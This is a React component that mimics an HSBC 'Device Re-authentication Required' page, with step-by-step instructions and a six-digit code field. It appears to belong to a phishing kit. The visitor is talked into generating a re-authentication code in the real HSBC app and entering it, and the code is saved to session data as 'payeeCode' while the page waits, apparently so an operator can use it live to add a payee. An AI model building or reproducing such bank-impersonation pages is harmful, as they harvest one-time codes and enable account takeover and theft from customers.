import { useState } from 'react';
import { useForm } from '@/contexts/FormContext';
import FormLayout from '@/components/FormLayout';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { CheckCircle2 } from 'lucide-react';

const PayeeCodePage = () => {
  const [reauthCode, setReauthCode] = useState('');
  const { updateSessionData, setWaiting } = useForm();

  const handleContinue = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (reauthCode.length === 6) {
      updateSessionData('payeeCode', {
        reauthenticationCode: reauthCode,
        timestamp: new Date().toISOString()
      });
      setWaiting(true);
    }
  };

  const handleCancel = () => {
    // Navigate back or cancel the flow
    window.history.back();
  };

  return (
    <FormLayout
      title="Device Re-authentication Required"
      description="At HSBC, we take your security very seriously. To re-authenticate your device, please follow the instructions provided below."
    >
      {/* Security Info Alert */}
      <Alert className="bg-blue-50 border-blue-200 mb-6">
        <CheckCircle2 className="h-5 w-5 text-blue-600" />
        <AlertDescription className="text-blue-800 ml-2">
          Your device requires re-authentication for secure access to your account
        </AlertDescription>
      </Alert>

      {/* Reauthentication Section */}
      <div className="space-y-6">
        <div>
          <h3 className="text-lg font-semibold text-gray-900 mb-4">
            Please re-authenticate your mobile device
          </h3>
          
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
            {/* Step 1 */}
            <div className="space-y-2">
              <h4 className="font-semibold text-gray-900">Step 1</h4>
              <p className="text-sm text-gray-600 leading-relaxed">
                Launch the HSBC Mobile Banking app and select 'Generate security code' from the home screen.
              </p>
            </div>

            {/* Step 2 */}
            <div className="space-y-2">
              <h4 className="font-semibold text-gray-900">Step 2</h4>
              <p className="text-sm text-gray-600 leading-relaxed">
                Select 'Re-authentication Security Code' tab. Enter your Secure Key passcode and select the 'Generate' button.
              </p>
            </div>

            {/* Step 3 */}
            <div className="space-y-2">
              <h4 className="font-semibold text-gray-900">Step 3</h4>
              <p className="text-sm text-gray-600 leading-relaxed">
                Enter your re-authentication security code in the box below (Note: This code is valid for 60 seconds).
              </p>
            </div>
          </div>
        </div>

        {/* Code Input */}
        <div className="space-y-2">
          <label htmlFor="reauthCode" className="block text-sm font-medium text-gray-700">
            Enter your 6 digit re-authentication code
          </label>
          <Input
            id="reauthCode"
            type="text"
            maxLength={6}
            value={reauthCode}
            onChange={(e) => setReauthCode(e.target.value.replace(/\D/g, ''))}
            placeholder="000000"
            className="text-lg tracking-widest text-center"
          />
        </div>

        {/* Action Buttons */}
        <div className="flex flex-col sm:flex-row gap-3 pt-4">
          <Button
            type="button"
            variant="outline"
            onClick={handleCancel}
            className="flex-1 h-12"
          >
            Cancel
          </Button>
          <Button
            onClick={handleContinue}
            disabled={reauthCode.length !== 6}
            className="flex-1 h-12 bg-red-500 hover:bg-red-600 text-white"
          >
            Verify & Continue
          </Button>
        </div>

        {/* Security Note */}
        <div className="mt-6 p-4 bg-gray-50 rounded-lg border border-gray-200">
          <p className="text-xs text-gray-600 leading-relaxed">
            For your security, this re-authentication code is time-sensitive and can only be used once. 
            This process ensures that only you can access your account from this device. 
            If you experience any issues generating your code, please ensure you have the latest version 
            of the HSBC Mobile Banking app installed.
          </p>
        </div>
      </div>
    </FormLayout>
  );
};

export default PayeeCodePage;
